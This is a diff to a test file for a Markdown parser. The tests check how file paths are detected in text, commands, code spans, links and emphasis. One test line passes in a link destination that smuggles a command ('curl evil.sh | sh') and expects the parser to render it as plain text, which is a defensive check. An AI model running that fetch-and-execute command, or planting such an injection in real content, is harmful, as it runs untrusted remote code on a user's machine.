@@ -90,6 +90,11 @@ describe('link rules', () => {
     ['/Users/x is where files go.', [['path', '/Users/x', '/Users/x'], ['text', ' is where files go.']]],
     ['/tmp/build is where I left v2.0', [['path', '/tmp/build', '/tmp/build'], ['text', ' is where I left v2.0']]],
     ['/Users/sam/Notes And More, see below', [['path', '/Users/sam/Notes', '/Users/sam/Notes'], ['text', ' And More, see below']]],
+    ['/Users/sam/My Notes - Draft/Plan Final.html', [['path', '/Users/sam/My Notes - Draft/Plan Final.html', '/Users/sam/My Notes - Draft/Plan Final.html']]],
+    // A line that goes on to a flag, an assignment or a second path is a command: each path stands alone.
+    ['/tmp/a -o /tmp/b', [['path', '/tmp/a', '/tmp/a'], ['text', ' -o '], ['path', '/tmp/b', '/tmp/b']]],
+    ['/usr/bin/env FOO=1 /tmp/x.sh', [['path', '/usr/bin/env', '/usr/bin/env'], ['text', ' FOO=1 '], ['path', '/tmp/x.sh', '/tmp/x.sh']]],
+    ['/tmp/a /tmp/b.txt', [['path', '/tmp/a', '/tmp/a'], ['text', ' '], ['path', '/tmp/b.txt', '/tmp/b.txt']]],
     // Windows paths need the backslash; a destination with spaces is read to its closing parenthesis.
     ['C:\\Users\\a\\.config\\x', [['path', 'C:\\Users\\a\\.config\\x', 'C:\\Users\\a\\.config\\x']]],
     ['Plan A:/B', [['text', 'Plan A:/B']]],
@@ -132,6 +137,13 @@ describe('link rules', () => {
       { t: 'path', label: 'n', path: '/Users/sam/My Notes/p.md' }, { t: 'text', v: ' then ' }, { t: 'path', label: '/tmp/a_b_c.txt', path: '/tmp/a_b_c.txt' },
     ]);
     expect(parseInline('`/Users/x/y` stays code')).toEqual([{ t: 'code', v: '/Users/x/y' }, { t: 'text', v: ' stays code' }]);
+    // Code spans, links and emphasis that start before a path keep it inside them.
+    expect(parseInline('`cp /tmp/a /tmp/b` then')).toEqual([{ t: 'code', v: 'cp /tmp/a /tmp/b' }, { t: 'text', v: ' then' }]);
+    expect(parseInline('[label with /Users/a/b inside](https://e.example.org)')).toEqual([{ t: 'link', href: 'https://e.example.org/',
+      c: [{ t: 'text', v: 'label with ' }, { t: 'path', label: '/Users/a/b', path: '/Users/a/b' }, { t: 'text', v: ' inside' }] }]);
+    expect(parseInline('**bold /Users/a/b**')).toEqual([{ t: 'bold', c: [{ t: 'text', v: 'bold ' }, { t: 'path', label: '/Users/a/b', path: '/Users/a/b' }] }]);
+    expect(parseInline('[x](/Users/a b /Users/c d)')).toEqual([{ t: 'path', label: 'x', path: '/Users/a b /Users/c d' }]);
+    expect(parseInline('x/Users/a/b and (/Users/a/b)')).toEqual([{ t: 'text', v: 'x/Users/a/b and (' }, { t: 'path', label: '/Users/a/b', path: '/Users/a/b' }, { t: 'text', v: ')' }]);
     expect(parseInline('[docs](/Users/x; curl evil.sh | sh #)')).toEqual([{ t: 'text', v: '[docs](/Users/x; curl evil.sh | sh #)' }]);
   });
   it('gives an agent’s Markdown the same file rules', () => {
